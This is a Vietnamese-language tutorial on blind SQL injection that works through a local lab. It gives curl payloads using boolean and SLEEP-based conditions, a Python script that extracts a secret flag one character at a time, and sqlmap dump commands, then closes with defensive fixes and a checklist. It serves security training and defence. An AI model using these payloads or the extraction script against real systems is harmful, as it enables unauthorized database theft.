# SQL Injection Blind — Boolean & Time Based

> **Độ khó:** Medium — **Trình độ:** intermediate

## Giới thiệu

**Blind SQLi** là SQLi nhưng app **KHÔNG hiển thị dữ liệu hay lỗi** — không có union, không có error message. Bạn chỉ nhận được 2 tín hiệu: **có kết quả / không có kết quả** (boolean) hoặc **phản hồi nhanh / chậm** (time-based). Nghe khó hơn, nhưng chỉ cần đúng logic là **vẫn đọc được toàn bộ database**, từng ký tự một. Đây là kỹ năng "cấp độ cao" của mọi pentester web.

---

## Phần A — Hiểu (Understand)

### Blind boolean-based là gì?

App không in dữ liệu, nhưng trả về 2 trang **khác nhau** khi câu điều kiện đúng/sai:

```
q = x' AND (SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a')-- -
   → ký tự đầu = 'a'?   Đúng → trang "found", Sai → trang "not found"
```

Bằng cách hỏi từng chữ cái một (`'a'`? `'b'`? `'c'`?...), bạn **lắp ghép** được mật khẩu.

> **Dễ hiểu:** Giống trò "20 câu hỏi" — bạn chỉ được nghe "đúng/sai", nhưng cứ hỏi đủ câu là ra đáp án. Mỗi ký tự cần ~30 câu hỏi (26 chữ + 10 số), thay vì đoán cả chuỗi dài vô hạn.

### Blind time-based là gì?

App luôn trả về cùng 1 trang dù đúng/sai — nhưng bạn **đo thời gian phản hồi**:

```sql
IF (điều kiện ĐÚNG, SLEEP(5), 0)   -- đúng → chờ 5 giây
```

- Đúng → response mất ~5s
- Sai → response tức thì

### Các hàm SQL cần biết

| Hàm | Tác dụng |
|-----|----------|
| `SUBSTRING(str, pos, len)` | Lấy đoạn ký tự |
| `ASCII(char)` | Mã ASCII của ký tự |
| `LENGTH(str)` | Độ dài chuỗi |
| `SLEEP(n)` | Ngủ n giây (MySQL, time-based) |
| `IF(cond, a, b)` | Điều kiện |
| `BENCHMARK(n, expr)` | Chạy lặp n lần (time-based) |

---

## Phần B — Khai thác: Lab Blind SQLi

### Bước 1: Khởi động lab

```bash
cd sqli-blind/lab
docker compose up -d
# Lab tại: http://localhost:7105
```

Lab là một trang tra cứu ID user: `id=1` hiện "User exists", `id=999` hiện "User not found" — **không lộ dữ liệu hay lỗi**. DB có bảng `secret_data` với 1 cột `flag`.

### Bước 2: Xác nhận blind boolean

```bash
$ curl -s "http://localhost:7105/?id=1' AND 1=1-- -"
User exists

$ curl -s "http://localhost:7105/?id=1' AND 1=2-- -"
User not found
```

<!-- Output already described via CLI commands above -->

> **Giải thích:** Khác biệt "exists/not found" là tín hiệu đúng/sai mà bạn dùng để hỏi database. Đây là bằng chứng blind boolean SQLi.

### Bước 3: Đếm độ dài flag

Hỏi `LENGTH`:

```bash
# Đúng nếu độ dài flag = 30
$ curl -s "http://localhost:7105/?id=1' AND LENGTH((SELECT flag FROM secret_data))=21-- -"
User exists
```

<!-- Output already described via CLI commands above -->

### Bước 4: Lấy ký tự đầu tiên

```bash
# Đúng nếu ký tự đầu là 'F'
$ curl -s "http://localhost:7105/?id=1' AND ASCII(SUBSTRING((SELECT flag FROM secret_data),1,1))=70-- -"
User exists
```

> `ASCII('F') = 70`. Thử `=65` ('A') → "User not found" → biết ký tự đầu không phải A, là F.

<!-- Output already described via CLI commands above -->

### Bước 5: Tự động hóa bằng script Python

Thay vì gõ tay 30 ký tự × 30 lần thử, viết script:

```python
import requests

url = "http://localhost:7105/"
flag = ""
for i in range(1, 22):           # 1..21 ký tự
    for code in range(32, 127):  # in được ASCII 32..126
        payload = f"1' AND ASCII(SUBSTRING((SELECT flag FROM secret_data),{i},1))={code}-- -"
        r = requests.get(url, params={"id": payload})
        if "User exists" in r.text:
            flag += chr(code)
            print(f"[{i}] {chr(code)}")
            break
print("FLAG:", flag)
```

<!-- Output already described via CLI commands above -->

> **Giải thích:** Script hỏi "ký tự thứ i có mã ASCII = code không?" cho từng code từ 32–126, tới khi "User exists" → đúng. Tự động ghép cả flag. Trong CTF bạn sẽ thấy kiểu script này khắp nơi — đây là bản chất của "blind".

### Bước 6: Time-based (khi không có tín hiệu true/false)

```bash
# Đúng → mất 5 giây, Sai → tức thì
$ time curl -s "http://localhost:7105/?id=1' AND IF((SELECT SUBSTRING(flag,1,1) FROM secret_data)='F',SLEEP(5),0)-- -"
real 5.002s   # = ký tự đầu là 'F'
```

<!-- Output already described via CLI commands above -->

> **Giải thích:** `IF(dk đúng, SLEEP(5), 0)` — nếu điều kiện đúng, DB ngủ 5s nên response trễ 5s. Đo `real` trong `time` là "tín hiệu đúng/sai" của bạn khi app trả lời đồng nhất.

### Bước 7: sqlmap tự động (đã hiểu thì dùng)

```bash
sqlmap -u "http://localhost:7105/?id=1" --batch --technique=B --dbs
sqlmap -u "http://localhost:7105/?id=1" --batch -D lab_db -T secret_data --dump
```

<!-- Output already described via CLI commands above -->

> ⚠️ `--technique=B` = chỉ dùng boolean blind; `T` = time-based. sqlmap gọi được nhưng **bạn phải tự viết được script tay trước** — đó là cách phân biệt người hiểu và người copy.

---

## Phần C — Phòng thủ & Checklist (Defend)

### Cách fix

- **Giống SQLi thường:** prepared statement, ẩn lỗi, least privilege.
- **Riêng blind:** dùng **cùng 1 response template** cho mọi trường hợp (đúng/sai đều trả "không tìm thấy") — nhưng đây chỉ giảm nhẹ; fix tận gốc vẫn là parameterized query.
- **Rate limit** endpoint truy vấn — làm chậm việc tự động brute từng ký tự.

### Checklist test nhanh

```text
[ ] ' AND 1=1-- -  vs ' AND 1=2-- -  (boolean khác biệt?)
[ ] IF(cond, SLEEP(5), 0)  (time-based, đo bằng time curl)
[ ] Xác nhận bảng/cột: AND EXISTS(...)  hoặc lệnh error nếu có
[ ] Lấy độ dài: LENGTH(...)  →  lấy từng ký tự: SUBSTRING(...) ASCII(...)
[ ] Viết script python tự động trước, sqlmap để đối chiếu
```

---
